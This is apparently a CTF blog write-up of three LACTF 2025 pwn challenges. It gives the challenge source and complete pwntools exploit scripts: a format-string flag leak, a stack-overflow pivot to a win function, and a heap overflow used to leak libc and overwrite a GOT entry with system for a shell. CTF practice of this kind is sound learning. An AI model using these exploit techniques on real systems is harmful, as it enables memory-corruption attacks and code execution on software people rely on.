---
title: "LACTF-2025"
date: 2024-10-02 00:00:00 +0800
categories: [pwn]
tags: [pwn,pivot,ret2gets,heap-overflow]
author: "kuvee"
layout: post

---

in this competition , i completed four chall . In the **Minecraft** chall , i also learned a lot about the ret2gets technique  

dowload file : [here](/assets/files/LACTF-2025.zip)
![score](assets/images/score.png)

##  2password



- this is warm-up chall , we will be entered 3 times , open the flag.txt  and read it into the stack

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void readline(char *buf, size_t size, FILE *file) {
  if (!fgets(buf, size, file)) {
    puts("wtf");
    exit(1);
  }
  char *end = strchr(buf, '\n');
  if (end) {
    *end = '\0';
  }
}

int main(void) {
  setbuf(stdout, NULL);
  printf("Enter username: ");
  char username[42];
  readline(username, sizeof username, stdin);
  printf("Enter password1: ");
  char password1[42];
  readline(password1, sizeof password1, stdin);
  printf("Enter password2: ");
  char password2[42];
  readline(password2, sizeof password2, stdin);
  FILE *flag_file = fopen("flag.txt", "r");
  if (!flag_file) {
    puts("can't open flag");
    exit(1);
  }
  char flag[42];
  readline(flag, sizeof flag, flag_file);
  if (strcmp(username, "kaiphait") == 0 &&
      strcmp(password1, "correct horse battery staple") == 0 &&
      strcmp(password2, flag) == 0) {
    puts("Access granted");
  } else {
    printf("Incorrect password for user ");
    printf(username);
    printf("\n");
  }
}
```

- Next is to use strcmp to check our input, but it doesn't do anything, we need attention to the code below

```c
printf(username)
```

Ill use this code to find the offset to the flag

```python
def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload
```

'}' in hex byte is 0x7d : 

![fsb](assets/images/fsb.png)


script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched",checksec=False)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('chall.lac.tf', 31142)

def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload

def fix(payload: bytes, seperator: str = "."):
    """ Unhex the payload and return as a string """
    rt = b""
    for i in payload.split(b'.')[:-1]: # the last one is empty
        i = i[2:] # removing the 0x
        if i[0] == 97: # remove the newline
            i = i[1:]
        rt += unhex(i)[::-1] # unhex and rev
    return rt

pl = generate(6,9)
p.sendlineafter(b'username: ',pl)

p.sendlineafter(b'password1: ',b'kuvee')
p.sendlineafter(b'password2: ',b'kuvee@@zzzzz')

p.recvuntil(b'Incorrect password for user ')
leak = p.recvline()
print(fix(leak))

p.interactive()
```

![flag](/assets/images/flag.png)

## state-change

- code is very short, we can reverse it easy , In the vuln() function there is a bug **bof** and win() func to get flag , but in **win** check **state** with **0xf1eeee2d** , we need to satisfy this condition to get flag

```c
#include <stdio.h>
#include <string.h>

char buf[0x500]; // Wow so useful
int state;
char errorMsg[0x70];

void win() {
    char filebuf[64];
    strcpy(filebuf, "./flag.txt");
    FILE* flagfile = fopen("flag.txt", "r");

    /* ********** ********** */
    // Note this condition in win()
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    /* ********** ********** */
    
    if (flagfile == NULL) {
        puts(errorMsg);
    } else {
        char buf[256];
        fgets(buf, 256, flagfile);
        buf[strcspn(buf, "\n")] = '\0';
        puts("Here's the flag: ");
        puts(buf);
    }
}

void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}

int main(){

    state = 0xdeaddead;
    strcpy(errorMsg, "Couldn't read flag file. Either create a test flag.txt locally and try connecting to the server to run instead.");

    setbuf(stdin, 0);
	setbuf(stdout, 0);

    vuln();
    
    return 0;
}
```

- i used **pivot** to change value of stage and return to **win** function to get flag

exp

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall')

#p = process()
p = remote('chall.lac.tf', 31593)

stage = 0x0000000000404540
offset = 32
gets = 0x00000000004012D0
pl = b'a'*32 + p64(stage+0x10) + p64(gets)
input()
p.sendafter(b'Who are you?',pl)

pl2 = b'b'*15 + p64(0xF1EEEE2D) + b'a'*16 + p64(exe.sym.win)
input()
p.sendline(pl2)


p.interactive()
```

![flag2](/assets/images/flag2.png)

## gamedev 

- The chall has many option , we'll go through each option

we have leak exe_address at main() func

```c
#include <stdio.h>
#include <stdlib.h>

struct Level *start = NULL;
struct Level *prev = NULL;
struct Level *curr = NULL;

struct Level
{
    struct Level *next[8];
    char data[0x20];
};

int get_num()
{
    char buf[0x10];
    fgets(buf, 0x10, stdin);
    return atoi(buf);
}

void create_level()
{
    if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }

    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }
    
    struct Level *level = malloc(sizeof(struct Level));
    if (level == NULL) {
        puts("Failed to allocate level.");
        return;
    }

    level->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        level->next[i] = NULL;

    prev = level;

    if (start == NULL)
        start = level;
    else
        curr->next[idx] = level;
}

void edit_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    fgets(curr->data, 0x40, stdin);
}

void test_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to test.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Level data: ");
    write(1, curr->data, sizeof(curr->data));
    putchar('\n');
}

void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    curr = curr->next[idx];
}

void reset()
{
    curr = start;
}

void menu()
{
    puts("==================");
    puts("1. Create level");
    puts("2. Edit level");
    puts("3. Test level");
    puts("4. Explore");
    puts("5. Reset");
    puts("6. Exit");

    int choice;
    printf("Choice: ");
    choice = get_num();

    if (choice < 1 || choice > 6)
        return;
    
    switch (choice)
    {
        case 1:
            create_level();
            break;
        case 2:
            edit_level();
            break;
        case 3:
            test_level();
            break;
        case 4:
            explore();
            break;
        case 5:
            reset();
            break;
        case 6:
            exit(0);
    }
}

void init()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    // Add starting level
    start = malloc(sizeof(struct Level));
    start->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        start->next[i] = NULL;
    curr = start;
}

int main()
{
    init();
    puts("Welcome to the heap-like game engine!");
    printf("A welcome gift: %p\n", main);
    while (1)
        menu();
    return 0;
}

```

- create_level() : 

Check prev_level and current level  

level ranges from 0->7

Use malloc() to initialize a new struct

Initialize the next pointer 



```c
void create_level()
{
    if (prev == curr) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }

    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }
    
    struct Level *level = malloc(sizeof(struct Level));
    if (level == NULL) {
        puts("Failed to allocate level.");
        return;
    }

    level->data[0] = '\0';
    for (int i = 0; i < 8; i++)
        level->next[i] = NULL;

    prev = level;

    if (start == NULL)
        start = level;
    else
        curr->next[idx] = level;
}
```

- edit_level() :  We will be able to input data into curr-data but it's  input 0x40 bytes?  and data only 20 bytes -> *Heap overflow*

```c
struct Level
{
    struct Level *next[8];
    char data[0x20];
};
```

```c
void edit_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to edit.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Enter level data: ");
    fgets(curr->data, 0x40, stdin);
}
```

-  test_level() : it's use write to print data of **curr-data**

```c
void test_level()
{
    if (start == NULL || curr == NULL) {
        puts("No level to test.");
        return;
    }

    if (curr == prev || curr == start) {
        puts("We encourage game creativity so try to mix it up!");
        return;
    }
    
    printf("Level data: ");
    write(1, curr->data, sizeof(curr->data));
    putchar('\n');
}

```
- explore() : Assign the level of input to the curr


```c
void explore()
{
    printf("Enter level index: ");
    int idx = get_num();

    if (idx < 0 || idx > 7) {
        puts("Invalid index.");
        return;
    }

    if (curr == NULL) {
        puts("No level to explore.");
        return;
    }
    
    curr = curr->next[idx];
}
```

- reset() : resets curr to start, allowing users to restart from the first level.  

```c
void reset()
{
    curr = start;
}
```

### vuln

- here , we'v a heap_overflow , what can we do with this? We will be able to overflow the data of the next struct.

![chunk](/assets/images/chunk.png)

comeback this func ,  it assigns curr to curr->next[idx]. But what if we do this?

explore(0) -> explore(1) -> explore(1)

The third call to explore() will allow us to read and write arbitrary data when combined with the edit() function.

```c
void explore()
{
    
    curr = curr->next[idx];
}
```

- it will look like this : 

```cs
0x557bb9e8a290  0x0000000000000000      0x0000000000000071      ........q.......
0x557bb9e8a2a0  0x0000557bb9e8a310      0x0000557bb9e8a380      ....{U......{U..
0x557bb9e8a2b0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2c0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2d0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2e0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a2f0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a300  0x0000000000000000      0x0000000000000071      ........q.......
0x557bb9e8a310  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a320  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a330  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a340  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a350  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x557bb9e8a360  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x557bb9e8a370  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0x557bb9e8a380  0x6161616161616161      0x0000557bb8d1dfd8      aaaaaaaa....{U..
0x557bb9e8a390  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3a0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3b0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3c0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3d0  0x0000000000000000      0x0000000000000000      ................
0x557bb9e8a3e0  0x0000000000000000      0x0000000000020c21      ........!.......         <-- Top chunk
```

- explore first : it will go to the next level (lv1) : **0x557bb9e8a380**

![image1](/assets/images/test.png)

- If we add one more level, we can completely read and write arbitrarily.

![image2](/assets/images/test1.png)

- Finally, we will overwrite the GOT, and perhaps got@atoi will be the easiest target in this challenge (libc 2.36 does not allow hooks).

exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

p.recvuntil(b'gift: ')
exe.address = int(p.recvline()[:-1],16) - 0x1662
log.info(f'exe: {hex(exe.address)}')

def create_level(idx):
    p.sendlineafter(b'Choice: ',b'1')
    p.sendlineafter(b'index: ',f'{idx}'.encode())

def edit(data):
    p.sendlineafter(b'Choice: ',b'2')
    p.sendlineafter(b'data: ',data)

def test_level():
    p.sendlineafter(b'Choice: ',b'3')

def expore(idx):
    p.sendlineafter(b'Choice: ',b'4')
    p.sendlineafter(b'index: ',f'{idx}'.encode())

def reset():
    p.sendlineafter(b'Choice: ',b'5')

# leak libc
input()
create_level(0)
create_level(1)

expore(0)
edit(b'a'*0x38 + p64(exe.got.printf-0x40))

reset()
expore(1)
expore(1)

test_level()

p.recvuntil(b'Level data: ')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - libc.sym.printf
log.info(f'libc: {hex(libc.address)}')

reset()

# write got

create_level(0)
create_level(1)
expore(0)
edit(b'a'*0x38 + p64(exe.got.atoi-0x40))

reset()

expore(1)
expore(1)

edit(p64(libc.sym.system))

p.sendlineafter(b'Choice: ',b'/bin/sh\x00')


p.interactive()
```

![flag3](/assets/images/flag3.png)

